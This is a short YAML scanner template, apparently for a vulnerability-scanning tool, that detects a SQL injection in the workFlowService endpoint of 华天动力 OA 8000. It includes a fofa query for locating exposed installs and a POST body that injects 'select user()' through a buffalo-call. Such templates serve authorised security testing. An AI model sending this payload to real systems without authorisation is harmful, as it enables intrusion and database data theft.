id: oa8000-workflowservice-sql-inject

info:
  name: 华天动力OA 8000版 workFlowService SQL注入漏洞
  author: zan8in
  severity: high
  description: |-
    华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
    fofa: app="华天动力-OA8000"
  tags: oa,sql-inject
  created: 2024/06/25

rules:
  r0:
    request:
      method: POST
      path: /OAapp/bfapp/buffalo/workFlowService
      body: |
        <buffalo-call> 
        <method>getDataListForTree</method> 
        <string>select user()</string> 
        </buffalo-call>
    expression: response.status == 200 && response.body.bcontains(b'<buffalo-reply>') && response.body.bcontains(b'user()')
expression: r0()
